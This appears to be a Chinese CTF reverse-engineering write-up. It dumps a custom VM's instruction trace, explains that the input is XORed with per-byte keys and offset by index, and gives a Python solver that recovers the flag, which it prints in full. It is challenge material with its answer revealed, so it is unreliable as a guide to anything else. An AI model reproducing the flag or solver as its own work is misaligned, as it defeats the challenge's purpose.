357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757[0005] :: mov s2, &amp;flag[0][0007] :: mov(1) s4, s2[0008] :: [ARRAY SLOT][0009] :: mov arr[15], &amp;1585408084625667200[0010] :: mov arr[16], &amp;195[0011] :: mov s3, &amp;arr[15][0012] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0013] :: add arr[15], s3, 0[0014] :: mov s2, &amp;r101002.r_address[0016] :: mov(24) arr[15], s2[0017] :: [ARRAY SLOT][0018] :: mov arr[42], &amp;141015791240320[0019] :: mov arr[43], &amp;195[0020] :: mov s3, &amp;arr[42][0021] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0022] :: add arr[42], s3, 0[0023] :: mov arr[42], s2[0024] :: mov s2, &amp;s4[0026] :: mov(1) arr[0], s2[0027] :: mov s2, &amp;flag[1][0028] :: mov s4, s2[0029] :: [ARRAY SLOT][0030] :: mov arr[78], &amp;1657465678663595136[0031] :: mov arr[79], &amp;195[0032] :: mov s3, &amp;arr[78][0033] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0034] :: add arr[78], s3, 0[0035] :: mov s2, &amp;r101002.r_address[0037] :: mov(24) arr[78], s2[0038] :: [ARRAY SLOT][0039] :: mov arr[105], &amp;72198609829168256[0040] :: mov arr[106], &amp;195[0041] :: mov s3, &amp;arr[105][0042] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0043] :: add arr[105], s3, 0[0044] :: mov arr[105], s2[0045] :: mov s2, &amp;s4[0047] :: mov(1) arr[0], s2[0048] :: mov s2, &amp;flag[2][0049] :: mov s4, s2[0050] :: [ARRAY SLOT][0051] :: mov arr[141], &amp;1153062520398099584[0052] :: mov arr[142], &amp;195[0053] :: mov s3, &amp;arr[141][0054] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0055] :: add arr[141], s3, 0[0056] :: mov s2, &amp;r101002.r_address[0058] :: mov(24) arr[141], s2[0059] :: [ARRAY SLOT][0060] :: mov arr[168], &amp;144256203867096192[0061] :: mov arr[169], &amp;195[0062] :: mov s3, &amp;arr[168][0063] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0064] :: add arr[168], s3, 0[0065] :: mov arr[168], s2[0066] :: mov s2, &amp;s4[0068] :: mov(1) arr[0], s2[0069] :: mov s2, &amp;flag[3][0070] :: mov s4, s2[0071] :: [ARRAY SLOT][0072] :: mov arr[204], &amp;1297177708473955456[0073] :: mov arr[205], &amp;195[0074] :: mov s3, &amp;arr[204][0075] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0076] :: add arr[204], s3, 0[0077] :: mov s2, &amp;r101002.r_address[0079] :: mov(24) arr[204], s2[0080] :: [ARRAY SLOT][0081] :: mov arr[231], &amp;216313797905024128[0082] :: mov arr[232], &amp;195[0083] :: mov s3, &amp;arr[231][0084] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0085] :: add arr[231], s3, 0[0086] :: mov arr[231], s2[0087] :: mov s2, &amp;s4[0089] :: mov(1) arr[0], s2[0090] :: mov s2, &amp;flag[4][0091] :: mov s4, s2[0092] :: exec r92.r_address &lt;- 803425cc40800010c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x10--------------------[0101] :: array [0x4008040cc250480, 0xc3, 0x0][0104] :: mov s3, &amp;r101.r_address[0105] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0106] :: add r101.r_address, s3, 0[0107] :: mov r101.r_address, s2[0108] :: mov s2, &amp;s4[0110] :: mov(1) arr[0], s2[0111] :: mov s2, &amp;flag[5][0112] :: mov s4, s2[0113] :: exec r113.r_address &lt;- 803425cc40800011c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x11--------------------[0122] :: array [0x5008040cc250480, 0xc3, 0x0][0125] :: mov s3, &amp;r122.r_address[0126] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0127] :: add r122.r_address, s3, 0[0128] :: mov r122.r_address, s2[0129] :: mov s2, &amp;s4[0131] :: mov(1) arr[0], s2[0132] :: mov s2, &amp;flag[6][0133] :: mov s4, s2[0134] :: exec r134.r_address &lt;- 803425cc40800012c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x12--------------------[0143] :: array [0x6008040cc250480, 0xc3, 0x0][0146] :: mov s3, &amp;r143.r_address[0147] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0148] :: add r143.r_address, s3, 0[0149] :: mov r143.r_address, s2[0150] :: mov s2, &amp;s4[0152] :: mov(1) arr[0], s2[0153] :: mov s2, &amp;flag[7][0154] :: mov s4, s2[0155] :: exec r155.r_address &lt;- 803425cc40800013c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x13--------------------[0164] :: array [0x7008040cc250480, 0xc3, 0x0][0167] :: mov s3, &amp;r164.r_address[0168] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0169] :: add r164.r_address, s3, 0[0170] :: mov r164.r_address, s2[0171] :: mov s2, &amp;s4[0173] :: mov(1) arr[0], s2[0174] :: mov s2, &amp;flag[8][0175] :: mov s4, s2[0176] :: exec r176.r_address &lt;- 803425cc40800014c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x14--------------------[0185] :: array [0x8008040cc250480, 0xc3, 0x0][0188] :: mov s3, &amp;r185.r_address[0189] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0190] :: add r185.r_address, s3, 0[0191] :: mov r185.r_address, s2[0192] :: mov s2, &amp;s4[0194] :: mov(1) arr[1], s2[0195] :: mov s2, &amp;flag[9][0196] :: mov s4, s2[0197] :: exec r197.r_address &lt;- 803425cc40800015c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x15--------------------[0206] :: array [0x9008040cc250480, 0xc3, 0x0][0209] :: mov s3, &amp;r206.r_address[0210] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0211] :: add r206.r_address, s3, 0[0212] :: mov r206.r_address, s2[0213] :: mov s2, &amp;s4[0215] :: mov(1) arr[1], s2[0216] :: mov s2, &amp;flag[10][0217] :: mov s4, s2[0218] :: exec r218.r_address &lt;- 803425cc40800016c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x16--------------------[0227] :: array [0xa008040cc250480, 0xc3, 0x0][0230] :: mov s3, &amp;r227.r_address[0231] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0232] :: add r227.r_address, s3, 0[0233] :: mov r227.r_address, s2[0234] :: mov s2, &amp;s4[0236] :: mov(1) arr[1], s2[0237] :: mov s2, &amp;flag[11][0238] :: mov s4, s2[0239] :: exec r239.r_address &lt;- 803425cc40800017c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x17--------------------[0248] :: array [0xb008040cc250480, 0xc3, 0x0][0251] :: mov s3, &amp;r248.r_address[0252] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0253] :: add r248.r_address, s3, 0[0254] :: mov r248.r_address, s2[0255] :: mov s2, &amp;s4[0257] :: mov(1) arr[1], s2[0258] :: mov s2, &amp;flag[12][0259] :: mov s4, s2[0260] :: exec r260.r_address &lt;- 803425cc40800018c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x18--------------------[0269] :: array [0xc008040cc250480, 0xc3, 0x0][0272] :: mov s3, &amp;r269.r_address[0273] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0274] :: add r269.r_address, s3, 0[0275] :: mov r269.r_address, s2[0276] :: mov s2, &amp;s4[0278] :: mov(1) arr[1], s2[0279] :: mov s2, &amp;flag[13][0280] :: mov s4, s2[0281] :: exec r281.r_address &lt;- 803425cc40800019c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x19--------------------[0290] :: array [0xd008040cc250480, 0xc3, 0x0][0293] :: mov s3, &amp;r290.r_address[0294] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0295] :: add r290.r_address, s3, 0[0296] :: mov r290.r_address, s2[0297] :: mov s2, &amp;s4[0299] :: mov(1) arr[1], s2[0300] :: mov s2, &amp;flag[14][0301] :: mov s4, s2[0302] :: exec r302.r_address &lt;- 803425cc40800024c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x24--------------------[0311] :: array [0xe008040cc250480, 0xc3, 0x0][0314] :: mov s3, &amp;r311.r_address[0315] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0316] :: add r311.r_address, s3, 0[0317] :: mov r311.r_address, s2[0318] :: mov s2, &amp;s4[0320] :: mov(1) arr[1], s2[0321] :: mov s2, &amp;flag[15][0322] :: mov s4, s2[0323] :: exec r323.r_address &lt;- 803425cc4080002cc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x2c--------------------[0332] :: array [0xf008040cc250480, 0xc3, 0x0][0335] :: mov s3, &amp;r332.r_address[0336] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0337] :: add r332.r_address, s3, 0[0338] :: mov r332.r_address, s2[0339] :: mov s2, &amp;s4[0341] :: mov(1) arr[1], s2[0342] :: mov s2, &amp;flag[16][0343] :: mov s4, s2[0344] :: exec r344.r_address &lt;- 803425cc40800026c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x26--------------------[0353] :: array [0x10008040cc250480, 0xc3, 0x0][0356] :: mov s3, &amp;r353.r_address[0357] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0358] :: add r353.r_address, s3, 0[0359] :: mov r353.r_address, s2[0360] :: mov s2, &amp;s4[0362] :: mov(1) arr[2], s2[0363] :: mov s2, &amp;flag[17][0364] :: mov s4, s2[0365] :: exec r365.r_address &lt;- 803425cc4080001ec3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x1e--------------------[0374] :: array [0x11008040cc250480, 0xc3, 0x0][0377] :: mov s3, &amp;r374.r_address[0378] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0379] :: add r374.r_address, s3, 0[0380] :: mov r374.r_address, s2[0381] :: mov s2, &amp;s4[0383] :: mov(1) arr[2], s2[0384] :: mov s2, &amp;flag[18][0385] :: mov s4, s2[0386] :: exec r386.r_address &lt;- 803425cc4080001fc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x1f--------------------[0395] :: array [0x12008040cc250480, 0xc3, 0x0][0398] :: mov s3, &amp;r395.r_address[0399] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0400] :: add r395.r_address, s3, 0[0401] :: mov r395.r_address, s2[0402] :: mov s2, &amp;s4[0404] :: mov(1) arr[2], s2[0405] :: mov s2, &amp;flag[19][0406] :: mov s4, s2[0407] :: exec r407.r_address &lt;- 803425cc40800020c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x20--------------------[0416] :: array [0x13008040cc250480, 0xc3, 0x0][0419] :: mov s3, &amp;r416.r_address[0420] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0421] :: add r416.r_address, s3, 0[0422] :: mov r416.r_address, s2[0423] :: mov s2, &amp;s4[0425] :: mov(1) arr[2], s2[0426] :: mov s2, &amp;flag[20][0427] :: mov s4, s2[0428] :: exec r428.r_address &lt;- 803425cc40800020c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x20--------------------[0437] :: array [0x14008040cc250480, 0xc3, 0x0][0440] :: mov s3, &amp;r437.r_address[0441] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0442] :: add r437.r_address, s3, 0[0443] :: mov r437.r_address, s2[0444] :: mov s2, &amp;s4[0446] :: mov(1) arr[2], s2[0447] :: mov s2, &amp;flag[21][0448] :: mov s4, s2[0449] :: exec r449.r_address &lt;- 803425cc40800021c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x21--------------------[0458] :: array [0x15008040cc250480, 0xc3, 0x0][0461] :: mov s3, &amp;r458.r_address[0462] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0463] :: add r458.r_address, s3, 0[0464] :: mov r458.r_address, s2[0465] :: mov s2, &amp;s4[0467] :: mov(1) arr[2], s2[0468] :: mov s2, &amp;flag[22][0469] :: mov s4, s2[0470] :: exec r470.r_address &lt;- 803425cc40800023c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x23--------------------[0479] :: array [0x16008040cc250480, 0xc3, 0x0][0482] :: mov s3, &amp;r479.r_address[0483] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0484] :: add r479.r_address, s3, 0[0485] :: mov r479.r_address, s2[0486] :: mov s2, &amp;s4[0488] :: mov(1) arr[2], s2[0489] :: mov s2, &amp;flag[23][0490] :: mov s4, s2[0491] :: exec r491.r_address &lt;- 803425cc40800027c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x27--------------------[0500] :: array [0x17008040cc250480, 0xc3, 0x0][0503] :: mov s3, &amp;r500.r_address[0504] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0505] :: add r500.r_address, s3, 0[0506] :: mov r500.r_address, s2[0507] :: mov s2, &amp;s4[0509] :: mov(1) arr[2], s2[0510] :: mov s2, &amp;flag[24][0511] :: mov s4, s2[0512] :: exec r512.r_address &lt;- 803425cc40800024c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x24--------------------[0521] :: array [0x18008040cc250480, 0xc3, 0x0][0524] :: mov s3, &amp;r521.r_address[0525] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0526] :: add r521.r_address, s3, 0[0527] :: mov r521.r_address, s2[0528] :: mov s2, &amp;s4[0530] :: mov(1) arr[3], s2[0531] :: mov s2, &amp;flag[25][0532] :: mov s4, s2[0533] :: exec r533.r_address &lt;- 803425cc40800025c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x25--------------------[0542] :: array [0x19008040cc250480, 0xc3, 0x0][0545] :: mov s3, &amp;r542.r_address[0546] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0547] :: add r542.r_address, s3, 0[0548] :: mov r542.r_address, s2[0549] :: mov s2, &amp;s4[0551] :: mov(1) arr[3], s2[0552] :: mov s2, &amp;flag[26][0553] :: mov s4, s2[0554] :: exec r554.r_address &lt;- 803425cc40800026c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x26--------------------[0563] :: array [0x1a008040cc250480, 0xc3, 0x0][0566] :: mov s3, &amp;r563.r_address[0567] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0568] :: add r563.r_address, s3, 0[0569] :: mov r563.r_address, s2[0570] :: mov s2, &amp;s4[0572] :: mov(1) arr[3], s2[0573] :: mov s2, &amp;flag[27][0574] :: mov s4, s2[0575] :: exec r575.r_address &lt;- 803425cc40800027c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [s4], 0x27--------------------[0584] :: array [0x1b008040cc250480, 0xc3, 0x0][0587] :: mov s3, &amp;r584.r_address[0588] :: setinfo s3, name=0x1a, info=0x1, other=0x0, shndx=0x0[0589] :: add r584.r_address, s3, 0[0590] :: mov r584.r_address, s2[0591] :: mov s2, &amp;s4[0593] :: mov(1) arr[3], s2[0594] :: mov s4, &amp;0[0595] :: mov fail(), &amp;0[0596] :: mov s5, &amp;0[0597] :: mov s2, &amp;arr[0][0599] :: mov s6, s2[0600] :: exec r600.r_address &lt;- 803425fc40800070c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x70--------------------[0609] :: mov s2, &amp;s6[0611] :: add s5, s5, s2[0614] :: mov s6, &amp;0[0615] :: mov s2, &amp;arr[0][0616] :: mov s6, s2[0617] :: exec r617.r_address &lt;- 803425fc4080007cc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x7c--------------------[0626] :: mov s2, &amp;s6[0628] :: add s5, s5, s2[0631] :: mov s6, &amp;0[0632] :: mov s2, &amp;arr[0][0633] :: mov s6, s2[0634] :: exec r634.r_address &lt;- 803425fc40800073c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x73--------------------[0643] :: mov s2, &amp;s6[0645] :: add s5, s5, s2[0648] :: mov s6, &amp;0[0649] :: mov s2, &amp;arr[0][0650] :: mov s6, s2[0651] :: exec r651.r_address &lt;- 803425fc40800078c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x78--------------------[0660] :: mov s2, &amp;s6[0662] :: add s5, s5, s2[0665] :: mov s6, &amp;0[0666] :: mov s2, &amp;arr[0][0667] :: mov s6, s2[0668] :: exec r668.r_address &lt;- 803425fc4080006fc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x6f--------------------[0677] :: mov s2, &amp;s6[0679] :: add s5, s5, s2[0682] :: mov s6, &amp;0[0683] :: mov s2, &amp;arr[0][0684] :: mov s6, s2[0685] :: exec r685.r_address &lt;- 803425fc40800027c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x27--------------------[0694] :: mov s2, &amp;s6[0696] :: add s5, s5, s2[0699] :: mov s6, &amp;0[0700] :: mov s2, &amp;arr[0][0701] :: mov s6, s2[0702] :: exec r702.r_address &lt;- 803425fc4080002ac3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2a--------------------[0711] :: mov s2, &amp;s6[0713] :: add s5, s5, s2[0716] :: mov s6, &amp;0[0717] :: mov s2, &amp;arr[0][0718] :: mov s6, s2[0719] :: exec r719.r_address &lt;- 803425fc4080002cc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2c--------------------[0728] :: mov s2, &amp;s6[0730] :: add s5, s5, s2[0733] :: mov s6, &amp;0[0734] :: mov s2, &amp;arr[1][0735] :: mov s6, s2[0736] :: exec r736.r_address &lt;- 803425fc4080007fc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x7f--------------------[0745] :: mov s2, &amp;s6[0747] :: add s5, s5, s2[0750] :: mov s6, &amp;0[0751] :: mov s2, &amp;arr[1][0752] :: mov s6, s2[0753] :: exec r753.r_address &lt;- 803425fc40800035c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x35--------------------[0762] :: mov s2, &amp;s6[0764] :: add s5, s5, s2[0767] :: mov s6, &amp;0[0768] :: mov s2, &amp;arr[1][0769] :: mov s6, s2[0770] :: exec r770.r_address &lt;- 803425fc4080002dc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2d--------------------[0779] :: mov s2, &amp;s6[0781] :: add s5, s5, s2[0784] :: mov s6, &amp;0[0785] :: mov s2, &amp;arr[1][0786] :: mov s6, s2[0787] :: exec r787.r_address &lt;- 803425fc40800032c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x32--------------------[0796] :: mov s2, &amp;s6[0798] :: add s5, s5, s2[0801] :: mov s6, &amp;0[0802] :: mov s2, &amp;arr[1][0803] :: mov s6, s2[0804] :: exec r804.r_address &lt;- 803425fc40800037c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x37--------------------[0813] :: mov s2, &amp;s6[0815] :: add s5, s5, s2[0818] :: mov s6, &amp;0[0819] :: mov s2, &amp;arr[1][0820] :: mov s6, s2[0821] :: exec r821.r_address &lt;- 803425fc4080003bc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x3b--------------------[0830] :: mov s2, &amp;s6[0832] :: add s5, s5, s2[0835] :: mov s6, &amp;0[0836] :: mov s2, &amp;arr[1][0837] :: mov s6, s2[0838] :: exec r838.r_address &lt;- 803425fc40800022c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x22--------------------[0847] :: mov s2, &amp;s6[0849] :: add s5, s5, s2[0852] :: mov s6, &amp;0[0853] :: mov s2, &amp;arr[1][0854] :: mov s6, s2[0855] :: exec r855.r_address &lt;- 803425fc40800059c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x59--------------------[0864] :: mov s2, &amp;s6[0866] :: add s5, s5, s2[0869] :: mov s6, &amp;0[0870] :: mov s2, &amp;arr[2][0871] :: mov s6, s2[0872] :: exec r872.r_address &lt;- 803425fc40800053c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x53--------------------[0881] :: mov s2, &amp;s6[0883] :: add s5, s5, s2[0886] :: mov s6, &amp;0[0887] :: mov s2, &amp;arr[2][0888] :: mov s6, s2[0889] :: exec r889.r_address &lt;- 803425fc4080008ec3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x8e--------------------[0898] :: mov s2, &amp;s6[0900] :: add s5, s5, s2[0903] :: mov s6, &amp;0[0904] :: mov s2, &amp;arr[2][0905] :: mov s6, s2[0906] :: exec r906.r_address &lt;- 803425fc4080003dc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x3d--------------------[0915] :: mov s2, &amp;s6[0917] :: add s5, s5, s2[0920] :: mov s6, &amp;0[0921] :: mov s2, &amp;arr[2][0922] :: mov s6, s2[0923] :: exec r923.r_address &lt;- 803425fc4080002ac3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2a--------------------[0932] :: mov s2, &amp;s6[0934] :: add s5, s5, s2[0937] :: mov s6, &amp;0[0938] :: mov s2, &amp;arr[2][0939] :: mov s6, s2[0940] :: exec r940.r_address &lt;- 803425fc40800059c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x59--------------------[0949] :: mov s2, &amp;s6[0951] :: add s5, s5, s2[0954] :: mov s6, &amp;0[0955] :: mov s2, &amp;arr[2][0956] :: mov s6, s2[0957] :: exec r957.r_address &lt;- 803425fc40800027c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x27--------------------[0966] :: mov s2, &amp;s6[0968] :: add s5, s5, s2[0971] :: mov s6, &amp;0[0972] :: mov s2, &amp;arr[2][0973] :: mov s6, s2[0974] :: exec r974.r_address &lt;- 803425fc4080002dc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2d--------------------[0983] :: mov s2, &amp;s6[0985] :: add s5, s5, s2[0988] :: mov s6, &amp;0[0989] :: mov s2, &amp;arr[2][0990] :: mov s6, s2[0991] :: exec r991.r_address &lt;- 803425fc40800029c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x29--------------------[1000] :: mov s2, &amp;s6[1002] :: add s5, s5, s2[1005] :: mov s6, &amp;0[1006] :: mov s2, &amp;arr[3][1007] :: mov s6, s2[1008] :: exec r1008.r_address &lt;- 803425fc40800034c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x34--------------------[1017] :: mov s2, &amp;s6[1019] :: add s5, s5, s2[1022] :: mov s6, &amp;0[1023] :: mov s2, &amp;arr[3][1024] :: mov s6, s2[1025] :: exec r1025.r_address &lt;- 803425fc4080002dc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x2d--------------------[1034] :: mov s2, &amp;s6[1036] :: add s5, s5, s2[1039] :: mov s6, &amp;0[1040] :: mov s2, &amp;arr[3][1041] :: mov s6, s2[1042] :: exec r1042.r_address &lt;- 803425fc40800061c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x61--------------------[1051] :: mov s2, &amp;s6[1053] :: add s5, s5, s2[1056] :: mov s6, &amp;0[1057] :: mov s2, &amp;arr[3][1058] :: mov s6, s2[1059] :: exec r1059.r_address &lt;- 803425fc40800032c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x8040fc], 0x32--------------------[1068] :: mov s2, &amp;s6[1070] :: add s5, s5, s2[1073] :: mov s6, &amp;0[1074] :: mov s2, &amp;flag[28][1075] :: mov s6, s2[1076] :: mov s2, &amp;flag[29][1077] :: mov s7, s2[1078] :: mov s8, &amp;0[1079] :: mov s2, &amp;s8[1080] :: add s8, s8, s2[1083] :: mov s2, &amp;s6[1084] :: add s8, s8, s2[1087] :: mov s9, &amp;0[1088] :: mov s2, &amp;s9[1089] :: add s9, s9, s2[1092] :: mov s2, &amp;s7[1093] :: add s9, s9, s2[1096] :: mov s2, &amp;s9[1097] :: add s10, s8, s2[1100] :: exec r1100.r_address &lt;- 8034255c4180006cc3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x80415c], 0x6c--------------------[1109] :: mov s2, &amp;s10[1111] :: add s5, s5, s2[1114] :: mov s6, &amp;0[1115] :: mov s7, &amp;0[1116] :: mov s8, &amp;0[1117] :: mov s9, &amp;0[1118] :: mov s10, &amp;0[1119] :: mov s2, &amp;flag[28][1120] :: mov s6, s2[1121] :: mov s2, &amp;flag[29][1122] :: mov s7, s2[1123] :: mov s8, &amp;0[1124] :: mov s2, &amp;s8[1125] :: add s8, s8, s2[1128] :: mov s2, &amp;s6[1129] :: add s8, s8, s2[1132] :: mov s2, &amp;s8[1133] :: add s8, s8, s2[1136] :: mov s9, &amp;0[1137] :: mov s2, &amp;s9[1138] :: add s9, s9, s2[1141] :: mov s2, &amp;s7[1142] :: add s9, s9, s2[1145] :: mov s2, &amp;s9[1146] :: add s10, s8, s2[1149] :: exec r1149.r_address &lt;- 8034255c418000a1c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x80415c], 0xa1--------------------[1158] :: mov s2, &amp;s10[1160] :: add s5, s5, s2[1163] :: mov s6, &amp;0[1164] :: mov s7, &amp;0[1165] :: mov s8, &amp;0[1166] :: mov s9, &amp;0[1167] :: mov s10, &amp;0[1168] :: mov s2, &amp;flag[30][1169] :: mov s6, s2[1170] :: mov s2, &amp;flag[31][1171] :: mov s7, s2[1172] :: mov s8, &amp;0[1173] :: mov s2, &amp;s8[1174] :: add s8, s8, s2[1177] :: mov s2, &amp;s6[1178] :: add s8, s8, s2[1181] :: mov s9, &amp;0[1182] :: mov s2, &amp;s9[1183] :: add s9, s9, s2[1186] :: mov s2, &amp;s7[1187] :: add s9, s9, s2[1190] :: mov s2, &amp;s9[1191] :: add s10, s8, s2[1194] :: exec r1194.r_address &lt;- 8034255c418000b1c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x80415c], 0xb1--------------------[1203] :: mov s2, &amp;s10[1205] :: add s5, s5, s2[1208] :: mov s6, &amp;0[1209] :: mov s7, &amp;0[1210] :: mov s8, &amp;0[1211] :: mov s9, &amp;0[1212] :: mov s10, &amp;0[1213] :: mov s2, &amp;flag[30][1214] :: mov s6, s2[1215] :: mov s2, &amp;flag[31][1216] :: mov s7, s2[1217] :: mov s8, &amp;0[1218] :: mov s2, &amp;s8[1219] :: add s8, s8, s2[1222] :: mov s2, &amp;s6[1223] :: add s8, s8, s2[1226] :: mov s2, &amp;s8[1227] :: add s8, s8, s2[1230] :: mov s9, &amp;0[1231] :: mov s2, &amp;s9[1232] :: add s9, s9, s2[1235] :: mov s2, &amp;s7[1236] :: add s9, s9, s2[1239] :: mov s2, &amp;s9[1240] :: add s10, s8, s2[1243] :: exec r1243.r_address &lt;- 8034255c418000e5c3000000000000000000000000000000-------------------- 0x0: xor byte ptr [0x80415c], 0xe5--------------------[1252] :: mov s2, &amp;s10[1254] :: add s5, s5, s2[1257] :: mov s6, &amp;0[1258] :: mov s7, &amp;0[1259] :: mov s8, &amp;0[1260] :: mov s9, &amp;0[1261] :: mov s10, &amp;0[1262] :: mov s2, &amp;s5[1264] :: mov(1) fail(), 大致思路是对输入异或然后+i对比数据 但是flag数组前四个没直接给出，有四个大数字以第一个为例1585408084625667200 转为16进制16008040cc253480 倒叙一下就是 803425cc40800016，再根据后面的数据类推，flag[0]就是0x16 123456789101112131415import hashlibxor=[0x16,0x17,0x10,0x12,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x24,0x2c,0x26,0x1e,0x1f,0x20,0x20,0x21,0x23,0x27,0x24,0x25,0x26,0x27]encflag=[0x70,0x7c,0x73,0x78,0x6f,0x27,0x2a,0x2c,0x7f,0x35,0x2d,0x32,0x37,0x3b,0x22,0x59,0x53,0x8e,0x3d,0x2a,0x59,0x27,0x2d,0x29,0x34,0x2d,0x61,0x32]a=&quot;&quot;for i in range(len(encflag)): a+=chr((encflag[i]-i)^xor[i])l = &quot;1234567890abcdef&quot;for b in l: for c in l: for d in l: flag = a+b+c+d+&quot;&#125;&quot; sha = hashlib.sha256(flag.encode(&quot;utf-8&quot;)).hexdigest() if sha[0:16] == &quot;f860464d767610bb&quot;: print(flag) break 最后的flag：flag{366c950370fec47e34581a0574} find_basicIDA 静态分析，可以明显看出程序加过 VM 且每个 handler 自身作为分发器 